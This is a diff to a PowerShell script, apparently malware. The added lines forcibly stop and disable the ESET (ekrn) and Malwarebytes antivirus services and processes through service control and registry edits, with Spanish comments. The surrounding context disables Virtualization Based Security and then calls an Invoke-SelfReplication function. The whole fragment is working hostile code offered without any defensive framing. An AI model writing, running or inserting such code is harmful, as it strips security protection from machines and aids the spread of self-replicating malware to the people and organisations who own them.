@@ -221,6 +221,19 @@ Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -prope
 # Disable Virtualization Based Security
 Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -properties @{"EnableVirtualizationBasedSecurity" = 0; "RequirePlatformSecurityFeatures" = 0}
 
+Stop-Service -Name "ekrn" -Force;
+Set-Service -Name "ekrn" -StartupType Disabled;
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ekrn" -Name "Start" -Value 4;
+
+# Detener y deshabilitar Malwarebytes
+Stop-Service -Name "MBAMService" -Force;
+Set-Service -Name "MBAMService" -StartupType Disabled;
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\MBAMService" -Name "Start" -Value 4;
+
+# Terminar procesos si siguen activos
+Stop-Process -Name "ekrn" -Force -ErrorAction SilentlyContinue;
+Stop-Process -Name "mbamservice" -Force -ErrorAction SilentlyContinue;
+
 # Call the Invoke-SelfReplication function
 Invoke-SelfReplication
 
